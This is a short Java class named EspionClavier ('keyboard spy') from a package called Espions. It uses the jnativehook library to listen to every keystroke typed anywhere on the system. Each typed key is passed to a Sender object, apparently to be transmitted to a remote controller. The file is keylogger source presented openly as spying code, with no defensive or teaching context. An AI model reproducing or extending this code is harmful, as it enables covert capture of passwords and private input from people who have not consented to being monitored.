/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Espions;

import controllers.Sender;
import org.jnativehook.NativeInputEvent;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Permet d'espionner les évenements du clavier
 * @author karakayn
 */
public class EspionClavier implements NativeKeyListener{

    private Sender sender;
    
    public EspionClavier(Sender sender)
    {
        super();
        this.sender = sender;
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        //Not supported yet
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        //Not supported yet
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        System.out.println("Key typed : "+NativeInputEvent.getModifiersText(nke.getModifiers()) + " " + nke.getKeyChar());
        this.sender.sendKeyTyped(nke.getKeyCode());
    }
    
}
